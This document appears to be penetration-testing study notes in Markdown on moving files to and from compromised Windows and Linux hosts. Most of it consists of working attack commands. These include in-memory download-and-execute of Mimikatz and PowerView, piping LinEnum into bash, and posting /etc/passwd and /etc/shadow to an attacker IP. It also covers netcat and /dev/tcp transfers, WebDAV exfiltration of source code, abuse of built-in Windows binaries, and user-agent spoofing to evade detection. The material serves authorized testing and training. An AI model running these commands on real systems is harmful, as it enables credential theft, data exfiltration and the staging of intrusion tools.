# File Transfers

1. [Windows File Transfer Methods](#windows-file-transfer-methods)
1. [Linux File Transfer Methods](#linux-file-transfer-methods)
1. [Transferring Files with Code](#transferring-files-with-code)
1. [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
1. [Protected File Transfers](#protected-file-transfers)
1. [Catching Files over HTTP/S](#catching-files-over-https)
1. [Living off The Land](#living-off-the-land)
1. [Detection](#detection)
1. [Evading Detection](#evading-detection)

## Windows File Transfer Methods

* Download operations: (download to Windows)

  * PowerShell base64 encode & decode:

    * We can encode a file to a base64 string, copy its contents from terminal & perform the reverse operation.

    * To ensure the file is correct, we can use ```md5sum``` to verify the checksum.

    ```shell
    md5sum id_rsa
    # md5 hash of sample ssh key
    # we want to transfer sample ssh key to target Windows machine

    cat id_rsa | base64 -w 0; echo
    # copy this content and paste into PowerShell terminal
    ```

    ```ps
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64-encoded string>"))
    # decodes and writes to file

    Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
    # confirm hashes match
    ```

  * PowerShell web downloads:

    * In any version of PowerShell, the ```System.Net.WebClient``` class can be used to download a file over HTTP, HTTPS or FTP - there are [multiple WebClient methods](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0).

    ```ps
    (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

    # DownloadFileAsync can be used alternatively
    (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
    ```

    ```ps
    # fileless method
    # using inbuilt function to download payload and execute it

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
    # instead of downloading script to disk
    # runs it directly in memory using Invoke-Expression or IEX
    # IEX also accepts pipeline input
    ```

    ```ps
    # Invoke-WebRequest cmdlet can be used
    # aliases - iwr, curl, wget

    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

    # can be piped with IEX for fileless
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 | IEX

    # if we get an Internet Explorer error, IWR should have -UseBasicParsing flag

    # for SSL/TLS errors, run this command
    # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    ```

  * SMB downloads:

    ```shell
    # on attacker machine
    # host SMB server
    sudo impacket-smbserver share -smb2support /tmp/smbshare

    # sometimes, unauthenticated guest access is blocked on Windows
    # so we need to use creds
    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    ```

    ```cmd
    # in target Windows machine
    # to copy file from SMB server
    copy \\192.168.220.133\share\nc.exe

    # if we are using creds, mount SMB server & copy
    net use n: \\192.168.220.133\share /user:test test
    copy n:\nc.exe
    ```

  * FTP downloads:

    ```shell
    # on attacker machine
    sudo pip3 install pyftpdlib

    # setup python3 ftp server
    sudo python3 -m pyftpdlib --port 21
    ```

    ```ps
    # on target machine
    (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
    ```

    ```cmd
    # if we do not have an interactive shell
    # we can create an FTP command file to download a file

    echo open 192.168.49.128 > ftpcommand.txt
    echo USER anonymous >> ftpcommand.txt
    echo binary >> ftpcommand.txt
    echo GET file.txt >> ftpcommand.txt
    echo bye >> ftpcommand.txt
    ftp -v -n -s:ftpcommand.txt
    # this downloads the file
    ```

* Upload operations: (upload from Windows)

  * PowerShell base64 encode & decode:

    ```ps
    [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
    # encode file to base64

    Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
    # get md5 hash
    ```

    ```shell
    # in attacker machine
    echo <base64 string> | base64 -d > hosts
    # decode base64 string and store in file

    md5sum hosts
    # hash should match
    ```
  
  * PowerShell web uploads:

    ```shell
    pip3 install uploadserver

    python3 -m uploadserver
    # webserver that hosts a file upload page
    ```

    ```ps
    # we can make use of PSUpload.ps1 script
    # use IWR for upload
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

    Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
    # uploads file
    ```

  * PowerShell base64 web upload:

    ```ps
    $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
    # base64-encoding of file
    
    Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
    # send it on attacker machine port
    ```

    ```shell
    nc -lvnp 8000
    # catch the base64 data

    echo <base64 string> | base64 -d -w 0 > hosts
    ```

  * SMB uploads:

    ```shell
    # enterprises usually do not allow SMB protocol out of internal network
    # so we would need to use SMB over HTTP with WebDAV

    # setup WebDAV in attacker machine
    sudo pip install wsgidav cheroot

    sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
    ```

    ```cmd
    # connect to webDAV share
    dir \\192.168.49.128\DavWWWRoot
    # this folder does not actually exist on the attacker machine
    # it is a keyword recognized by Windows Shell to connect to root of webDAV server
    # we can alternatively mention an existing folder

    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
    # upload files
    ```

  * FTP uploads:

    ```shell
    sudo python3 -m pyftpdlib --port 21 --write
    # start ftp server with --write
    # to allow clients to upload files
    ```

    ```ps
    (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
    # upload file
    ```

    ```cmd
    # we can also create a command file for client
    echo open 192.168.49.128 > ftpcommand.txt
    echo USER anonymous >> ftpcommand.txt
    echo binary >> ftpcommand.txt
    echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
    echo bye >> ftpcommand.txt
    ftp -v -n -s:ftpcommand.txt
    ```

## Linux File Transfer Methods

* Download operations: (download to Linux)

  * Base64 encoding/decoding:

    ```shell
    # on attacker machine
    md5sum id_rsa

    cat id_rsa | base64 -w 0; echo
    # encode to base64
    ```

    ```shell
    # on target machine
    echo -n "<base64-encoded string>" | base64 -d > id_rsa
    # decode file

    md5sum id_rsa
    # confirm hashes match
    ```
  
  * Web downloads with ```wget``` and ```curl```:

    ```shell
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
    # download using wget

    curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    # download using curl
    ```

  * Fileless attacks:

    ```shell
    curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
    # fileless download with curl

    wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
    # fileless download with wget
    ```

  * Download with Bash (```/dev/tcp```):

    ```shell
    exec 3<>/dev/tcp/10.10.10.32/80
    # connect to target webserver

    echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
    # HTTP GET request

    cat <&3
    # print the response
    ```

  * SSH downloads:

    ```shell
    # on attacker machine
    sudo systemctl enable ssh

    sudo systemctl start ssh
    # setup and start ssh server

    netstat -lnpt
    # check for ssh listening port
    ```

    ```shell
    # on target machine
    # use scp utility
    scp plaintext@192.168.49.128:/root/myroot.txt .
    ```

* Upload operations (upload from Linux):

  * Web upload:

    ```shell
    # on attacker machine
    sudo python3 -m pip install --user uploadserver

    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
    # generate self-signed cert

    mkdir https && cd https

    sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
    # this starts the server
    ```

    ```shell
    # on target machine
    curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
    # upload multiple files
    # --insecure flag used for self-signed cert
    ```
  
  * Alternative web file transfer:

    ```shell
    # on target machine
    # multiple ways to start a web server
    # depending on whatever language is setup on target

    python3 -m http.server

    python2.7 -m SimpleHTTPServer

    php -S 0.0.0.0:8000

    ruby -run -ehttpd . -p8000
    ```

    ```shell
    # download file to attacker machine
    wget 192.168.49.128:8000/filetotransfer.txt
    ```

  * SCP upload:

    ```shell
    # on target machine
    # if outbound SSH connection is allowed
    scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
    ```

## Transferring Files with Code

* Python:

  ```shell
  # python 2
  python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

  # python 3
  python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
  ```

  ```shell
  # to upload using python3
  # on attacker machine
  python3 -m uploadserver

  # on target machine
  python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd", "rb")})'
  ```

* PHP:

  ```shell
  # using file_get_contents() and file_put_contents()
  php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
  # -r is used to run one-liners

  # alternatively, we can use fopen()
  php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

  # we can download a file and pipe it to bash
  # @file works if fopen wrappers are enabled
  php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
  ```

* Ruby:

  ```shell
  # -e for one-liners
  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
  ```

* Perl:

  ```shell
  perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
  ```

* JavaScript:

  ```js
  var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
  WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
  WinHttpReq.Send();
  BinStream = new ActiveXObject("ADODB.Stream");
  BinStream.Type = 1;
  BinStream.Open();
  BinStream.Write(WinHttpReq.ResponseBody);
  BinStream.SaveToFile(WScript.Arguments(1));

  // save this script as wget.js
  ```

  ```shell
  # to download file
  cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
  ```

* VBScript:

  ```vbscript
  dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
  dim bStrm: Set bStrm = createobject("Adodb.Stream")
  xHttp.Open "GET", WScript.Arguments.Item(0), False
  xHttp.Send

  with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
  end with
  ```

  ```shell
  # download file
  cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
  ```

## Miscellaneous File Transfer Methods

* Netcat:

  ```shell
  # on target machine
  nc -l -p 8000 > SharpKatz.exe
  # if it is using ncat, we would need to add --recv-only
  # to close connection once file transfer is done

  # on attacker machine
  wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

  nc -q 0 192.168.49.128 8000 < SharpKatz.exe
  # -q 0 for closing connection once done
  # if using ncat, we would use --send-only flag instead
  ```

  ```shell
  # alternative method
  # when firewall blocks inbound connections on target

  # on attacker
  sudo nc -l -p 443 -q 0 < SharpKatz.exe
  # for ncat, use --send-only instead of -q 0

  # on target
  nc 192.168.49.128 443 > SharpKatz.exe
  # for ncat, use --recv-only

  # and if target machine does not include netcat or ncat
  cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
  ```

* PowerShell:

  * PowerShell Remoting (```WinRM```) can be used for file transfer - creates both HTTP (TCP/5985) and HTTPS (TCP/5986) listener.

  * To create a session, we would need admin access, be a member of ```Remote Management Users``` group, or have explicit permissions for PowerShell Remoting.

  ```ps
  # on attacker machine
  Test-NetConnection -ComputerName DATABASE01 -Port 5985
  # confirm WinRM port 5985 is open on target

  # assuming we are Administrator on attacker machine
  # the session already has privileges over target, so no creds need
  $Session = New-PSSession -ComputerName DATABASE01
  # create session and store results in variable

  # copy from attacker to target
  Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

  # copy from target to attacker
  Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
  ```

* RDP:

  * If we have RDP access, we can simply copy-and-paste files from one machine to another.

  * For Linux, we can use ```xfreerdp``` or ```rdesktop``` - but sometimes if copy-and-paste does not work, we can mount files.

  ```shell
  # mount local resource in remote RDP session
  # using rdesktop
  rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

  # using xfreerdp
  xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

  # to access the directory, we can connect to \\tsclient\ on Windows
  ```

## Protected File Transfers

* File encryption on Windows:

  * [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) can be used to encrypt files:

    ```ps
    # after transferring script to target
    Import-Module .\Invoke-AESEncryption.ps1

    # example encryption of file
    Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
    # encrypted file has .aes extension
    ```

* File encryption on Linux:

  * ```OpenSSL``` can be used for encryption on Linux:

    ```shell
    openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
    # provide a strong password for encryption

    # to decrypt it
    openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
    # provide the same password for decryption
    ```

## Catching Files over HTTP/S

* We can create a secure web server using ```Nginx``` for file upload operations:

  ```shell
  # create dir to handle uploaded files
  sudo mkdir -p /var/www/uploads/SecretDir

  # change owner to www-data
  sudo chown -R www-data:www-data /var/www/uploads/SecretDir

  # create nginx config file
  sudo vim /etc/nginx/sites-available/upload.conf

  # symlink new site to sites-enabled dir
  sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

  # start nginx
  sudo systemctl restart nginx.service

  # verify errors
  tail -2 `/var/log/nginx/error.log`
  ss -lnpt | grep `80`
  ps -ef | grep `2811`

  # in this case, there is a module already listening on port 80
  # remove default nginx config which binds on port 80
  sudo rm /etc/nginx/sites-enabled/default

  # test upload file using curl
  curl -T /etc/passwd http://localhost:9001/SecretDir/users.txt

  # check
  tail -1 /var/www/uploads/SecretDir/users.txt
  ```

  ```shell
  # nginx config file contents
  server {
    listen 9001;
    
    location /SecretDir/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
  }
  ```

## Living off The Land

* [LOLBAS](https://lolbas-project.github.io/) - Windows:

  * Search for ```/download``` or ```/upload``` in LOLBAS for binaries.

  ```cmd
  # CertReq.exe example

  # on attacker machine
  sudo nc -lvnp 80

  # on target Windows machine
  certreq.exe -Post -config http://192.168.49.128/ c:\windos\win.ini
  # send file to nc session
  ```

* [GTFObins](https://gtfobins.github.io/) - Linux:

  * Search for ```+file download``` or ```+file upload```.

  ```shell
  # openssl example

  # on attacker machine
  # create cert
  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

  # setup server
  openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

  # on target Linux machine
  openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
  ```

* Other command Living off the Land tools:

  ```ps
  # bitsadmin for file download
  bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

  # bitstransfer
  Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
  ```

  ```cmd
  # certutil for file download
  certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
  ```

## Detection

* Whitelisting commands allows for quick detection & alerts on unusual command lines.

* [User agents](https://useragentstring.com/index.php) are used in the file transfers - organizations can identify potential legit user agent strings and filter out those to focus on anomalies.

* Malicious file transfers can be detected by their user agents/headers.

## Evading Detection

* Changing user agent:

  ```ps
  # list out user agents
  [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

  # if Chrome is used internally, for example
  # we can use a user agent for that with Invoke-WebRequest

  $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

  Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
  ```

* LOLBAS / GTFObins:

  ```ps
  # in case of application whitelisting
  # we can use living off the land binaries

  # GfxDownloadWrapper.exe example
  GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
  ```
